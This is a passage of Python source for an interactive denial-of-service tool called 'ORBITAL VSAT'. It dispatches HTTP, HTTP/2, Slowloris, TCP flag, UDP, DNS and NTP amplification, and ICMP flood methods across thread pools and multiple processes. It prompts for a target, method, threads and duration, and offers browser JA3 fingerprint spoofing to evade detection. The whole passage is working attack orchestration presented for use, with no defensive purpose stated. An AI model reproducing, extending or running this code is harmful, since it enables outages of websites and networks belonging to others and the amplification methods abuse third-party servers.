            "TRACE": self.httpExecutor,
            "RANDOM": self.httpExecutor,
            "SLOWLORIS": self.slowlorisExecutor,
            "SLOW-POST": self.slow_postExecutor,
            "H2-GET": self.h2Executor,
            "H2-POST": self.h2Executor,
            "H2-PING": self.h2_pingExecutor,
            "TCP": self.tcpExecutor,
            "SYN": self.synExecutor,
            "ACK": self.ackExecutor,
            "RST": self.rstExecutor,
            "FIN": self.finExecutor,
            "XMAS": self.xmasExecutor,
            "UDP": self.udpExecutor,
            "UDP-FRAG": self.udp_fragExecutor,
            "DNS-AMP": self.dns_ampExecutor,
            "NTP-AMP": self.ntp_ampExecutor,
            "ICMP": self.icmpExecutor,
        }
        ThreadsExecutor = methodOptions.get(self.method, self.httpExecutor)
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(ThreadsExecutor, i) for i in range(self.threads)]
            while self.running.value:
                sleep(1)

    def statsExecutor(self):
        """Stats Display"""
        start = time.time()
        lastCount = 0
        lastBytes = 0
        while self.running.value:
            sleep(1)
            elapsed = time.time() - start
            with self.statsLock:
                count = self.requestsCount.value
                totalBytes = self.bytesSent.value
            diff = count - lastCount
            bdiff = totalBytes - lastBytes
            rps = diff
            mbps = (bdiff * 8) / (1024 * 1024)
            lastCount = count
            lastBytes = totalBytes
            print(
                f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.CYAN} REQUESTS: {Fore.LIGHTGREEN_EX}[{Fore.LIGHTRED_EX} {count:,} {Fore.LIGHTGREEN_EX}] {Fore.MAGENTA} TARGET: {Fore.GREEN} {self.host} {Fore.MAGENTA} METHODS: {Fore.GREEN} {self.method} {Fore.MAGENTA} IP: {Fore.GREEN} {self.ip}:{self.port} {Fore.MAGENTA} RPS: {Fore.GREEN} {rps:,} {Fore.MAGENTA} BW: {Fore.GREEN} {mbps:.1f} Mbps {Fore.RESET}"
            )

    def start(self):
        try:
            self.setup()
        except Exception:
            return
        self.running.value = 1
        animx(f"\n{Fore.GREEN} {'=' * 100}")
        animx(
            f"{Fore.CYAN}[{Fore.RED} ORBITAL VSAT {Fore.CYAN}] {Fore.BLUE} STARTING ATTACK {Fore.YELLOW} {self.method} {Fore.RESET}"
        )
        animx(f"{Fore.GREEN} {'=' * 100}\n")
        statsThread = threading.Thread(target=self.statsExecutor, daemon=True)
        statsThread.start()
        if self.clusterMode:
            processes = []
            for i in range(self.processes):
                p = mp.Process(target=self.cluster_process, args=(i,))
                p.start()
                processes.append(p)
                sleep(0.02)
            animx(
                f"{Fore.CYAN}[{Fore.RED} ORBITAL VSAT {Fore.CYAN}] {Fore.BLUE} CLUSTER: {Fore.YELLOW} {self.processes * self.threads} {Fore.YELLOW} THREADS ACTIVE!\n {Fore.RESET}"
            )
            try:
                sleep(self.duration)
            except KeyboardInterrupt:
                pass
            self.running.value = 0
            for p in processes:
                p.join(timeout=2)
                if p.is_alive():
                    p.terminate()
        else:
            methodOptions = {
                "GET": self.httpExecutor,
                "POST": self.httpExecutor,
                "PUT": self.httpExecutor,
                "HEAD": self.httpExecutor,
                "DELETE": self.httpExecutor,
                "PATCH": self.httpExecutor,
                "OPTIONS": self.httpExecutor,
                "CONNECT": self.httpExecutor,
                "TRACE": self.httpExecutor,
                "RANDOM": self.httpExecutor,
                "SLOWLORIS": self.slowlorisExecutor,
                "SLOW-POST": self.slow_postExecutor,
                "H2-GET": self.h2Executor,
                "H2-POST": self.h2Executor,
                "H2-PING": self.h2_pingExecutor,
                "TCP": self.tcpExecutor,
                "SYN": self.synExecutor,
                "ACK": self.ackExecutor,
                "RST": self.rstExecutor,
                "FIN": self.finExecutor,
                "XMAS": self.xmasExecutor,
                "UDP": self.udpExecutor,
                "UDP-FRAG": self.udp_fragExecutor,
                "DNS-AMP": self.dns_ampExecutor,
                "NTP-AMP": self.ntp_ampExecutor,
                "ICMP": self.icmpExecutor,
            }
            ThreadsExecutor = methodOptions.get(self.method, self.httpExecutor)
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [
                    executor.submit(ThreadsExecutor, i) for i in range(self.threads)
                ]
                animx(
                    f"{Fore.CYAN}[{Fore.RED} ORBITAL VSAT {Fore.CYAN}] {Fore.BLUE} RUNNING: {Fore.YELLOW} {self.threads} {Fore.YELLOW} THREADS!\n {Fore.RESET}"
                )
                try:
                    sleep(self.duration)
                except KeyboardInterrupt:
                    pass
                self.running.value = 0
        sleep(2)
        with self.statsLock:
            finalCount = self.requestsCount.value
            finalBytes = self.bytesSent.value
        animx(
            f"{Fore.CYAN}[{Fore.RED} ORBITAL VSAT {Fore.CYAN}] {Fore.BLUE} FINAL RESULTS {Fore.RESET}"
        )
        animx(f"{Fore.GREEN} {'=' * 100}")
        animx(
            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} TOTAL REQUESTS: {Fore.MAGENTA} {finalCount:,} {Fore.RESET}"
        )
        animx(
            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} TOTAL SENT: {Fore.MAGENTA} {finalBytes / 1048576:.2f} {Fore.BLUE} Mb {Fore.RESET}"
        )
        if self.duration > 0:
            animx(
                f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} AVG RPS: {Fore.MAGENTA} {finalCount / self.duration:.0f} {Fore.RESET}"
            )
            animx(
                f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} AVG Bandwidth: {Fore.MAGENTA} {(finalBytes * 8) / (self.duration * 1048576):.2f} {Fore.BLUE} Mbps {Fore.RESET}"
            )


def main():
    clear()
    animx(banner)
    try:
        choice = (
            input(
                f"{Fore.MAGENTA}[{Fore.YELLOW} INFO {Fore.MAGENTA}] {Fore.GREEN}Continue? {Fore.GREEN}Y{Fore.WHITE}/{Fore.RED}n{Fore.WHITE}/{Fore.CYAN}h {Fore.YELLOW}"
            )
            .strip()
            .lower()
        )
        if choice == "h":
            animx(helper)
            input(
                f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} PRESS ENTER TO CONTINUE .... {Fore.RESET}"
            )
        elif choice == "n":
            sys.exit(0)
        animx(f"{Fore.RED} ORBITAL CONFIGURATION{Fore.RESET}")
        tester = OrbitalVSAT()
        tester.target = input(
            f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} TARGET {Fore.WHITE} > {Fore.CYAN}"
        ).strip()
        if not tester.target:
            return
        tester.method = (
            input(
                f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} METHODS {Fore.WHITE} > {Fore.CYAN}"
            )
            .strip()
            .upper()
        )
        if not tester.method:
            tester.method = "POST"
        if tester.method in [
            "GET",
            "POST",
            "PUT",
            "HEAD",
            "DELETE",
            "PATCH",
            "OPTIONS",
            "CONNECT",
            "TRACE",
            "RANDOM",
            "H2-GET",
            "H2-POST",
        ]:
            proto = (
                input(
                    f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} PROTOCOL {Fore.WHITE} [ h1 | h2 | default h1 ] > {Fore.CYAN}"
                )
                .strip()
                .lower()
            )
            tester.protocol = proto if proto in ["h1", "h2", "h3"] else "h1"
            ja3 = (
                input(
                    f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} JA3 PROFILE {Fore.WHITE} [ chrome | firefox | safari ] > {Fore.CYAN}"
                )
                .strip()
                .lower()
            )
            tester.ja3profile = (
                ja3 if ja3 in ["chrome", "firefox", "safari"] else "chrome"
            )
        threads = input(
            f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} THREADS {Fore.WHITE} [ default 500 ] > {Fore.CYAN}"
        ).strip()
        tester.threads = int(threads) if threads else 500
        duration = input(
            f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} DURATION {Fore.WHITE} [ seconds, default 60 ] > {Fore.CYAN}"
        ).strip()
        tester.duration = int(duration) if duration else 60
        cluster = (
            input(
                f"{Fore.MAGENTA}[{Fore.YELLOW} SET {Fore.MAGENTA}] {Fore.GREEN} CLUSTER MODE {Fore.WHITE} [ Y/n ] > {Fore.CYAN}"
            )
            .strip()
            .lower()
        )
        tester.clusterMode = cluster == "y"
        tester.start()
    except KeyboardInterrupt:
        animx(
            f"{Fore.RED}[{Fore.YELLOW} INFO {Fore.RED}] {Fore.YELLOW} KEYBOARD INTERRUPTED."
        )
        sys.exit(0)
    except Exception as e:
        animx(
            f"{Fore.YELLOW}[{Fore.RED} ERROR {Fore.YELLOW}]: {Fore.RED} {e} {Fore.RESET}"
        )


if __name__ == "__main__":
    main()
